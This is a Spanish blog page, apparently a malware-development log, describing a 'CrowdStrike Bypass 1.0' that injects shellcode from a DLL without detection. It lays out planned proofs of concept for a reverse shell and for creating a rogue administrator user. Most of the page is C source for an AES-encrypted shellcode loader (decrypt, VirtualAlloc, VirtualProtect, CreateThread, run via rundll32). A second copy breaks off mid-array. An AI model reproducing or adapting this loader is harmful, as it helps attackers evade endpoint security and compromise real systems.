<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Bypaseando mis limitaciones | El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Bypaseando mis limitaciones" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR" />
<meta property="og:description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR" />
<link rel="canonical" href="http://localhost:4000/Crowdstrike_bypass1_0.html" />
<meta property="og:url" content="http://localhost:4000/Crowdstrike_bypass1_0.html" />
<meta property="og:site_name" content="Bypaseando mis limitaciones" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Bypaseando mis limitaciones" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR","headline":"Bypaseando mis limitaciones","url":"http://localhost:4000/Crowdstrike_bypass1_0.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Bypaseando mis limitaciones</h1>
        </a>
        <h2>El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR</h2>

        <section id="downloads">
          
            <a href="" class="btn">Download as .zip</a>
            <a href="" class="btn">Download as .tar.gz</a>
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="crowdstrike-bypass-10">Crowdstrike Bypass 1.0</h1>

<p>Comenzamos el post con buenas y malas noticias. Las buenas <code class="language-plaintext highlighter-rouge">Tenemos un bypass para inyectar código en crowdstrike</code>, las malas son que aún no es un bypass completo. 
Por lo tanto, ¿que se ha conseguido? tenemos un código que partiendo de un binario tipo DLL, es capaz de inyectar un shellcode sin detección que es capaz de realizar comandos sobre el sistema operativo <code class="language-plaintext highlighter-rouge">WoooU</code>.</p>

<h1 id="limitaciones">Limitaciones</h1>

<p>Las limitaciones al realizar las pruebas con un sistema operativo que tenga este EDR comercial son dos:</p>
<ul>
  <li>Limitación en la escritura en disco: En tiempo de escritura sobre el sistema operativo el EDR realiza un análisis del binario y lo califica con un nivel de peligrosidad, que puede ser puesto en cuarentena he incluso borrado.
Esto ha ocurrido con el 90% de las muestras que he probado, pero se ha detectado una debilidad con cierto tipo de inyección desde una DLL, que será el camino que explotaremos y analizaremos a continuación.</li>
  <li>Limitación en tiempo de ejecución: No quiere decir que por que el EDR permita la escritura en disco no lo esté analizando en tiempo de ejecución. Esto reduce el porcentaje de los binarios probados un 7% más aproximadamente.</li>
</ul>

<p>Por lo tanto si, has seguido el blog hasta este punto, puedes empezar a pertenece a ese 3% restante que puede inyectar código en el EDR!!.</p>

<p>Ahora bien, la inyección no es completa y el motivo lo presento en el siguiente diagrama:</p>

<p><img src="/assets/images/EDR_injecrion_crowdstrike.png" alt="crowdstrike_bypass_1_0" /></p>

<p>Esto quiere decir que el nuevo proceso malicioso tras la inyección del payload/shellcode está auditado y su ejecución puede ser bloqueada en el caso de que los umbrales de actividad maliciosa <code class="language-plaintext highlighter-rouge">AssociateIndicator</code> (para los que entiendan de crowdstrike) sobrepasen el umbral permitido.</p>

<h1 id="pruebas-de-concepto">Pruebas de concepto</h1>

<p>Se realizarán 3 pruebas de concepto en el siguiente orden:</p>
<ul>
  <li>Dll con inyección de código que muestra una calculadora</li>
  <li>Dll con shell reversa a un entorno colindante en un Sistema operativo Kali <code class="language-plaintext highlighter-rouge">persistencia</code></li>
  <li>Dll para escalada de privilegios, creando un nuevo usuario administrador f0ns1 <code class="language-plaintext highlighter-rouge">escalada de privilegios</code></li>
</ul>

<h2 id="inyección-de-código-base">Inyección de código base</h2>

<p>Sorprendentemente, la siguiente inyección de código funciona en crowdstrike desde una DLL. permitiendo tanto la escritura en disco como la ejecución del código mediante runddl32.exe:</p>

<p>Test 1:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
</span>

<span class="k">extern</span> <span class="s">"C"</span><span class="p">{</span> 
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xb7</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xa3</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x41</span> <span class="p">};</span>

<span class="kt">int</span> <span class="n">AESDecrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
        <span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
        <span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">payload_len</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        
        <span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
        <span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
        
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="n">f0ns1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span> <span class="n">exec_mem</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">rv</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">th</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldprotect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
	<span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="n">AESDecrypt</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
	<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">);</span>
	<span class="n">rv</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">rv</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
					<span class="n">th</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
					<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

<span class="p">}</span>
<span class="p">}</span>

<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>  <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>Test 2:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
</span>



<span class="c1">// calc shellcode (exitThread) - 64-bit</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x7</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span 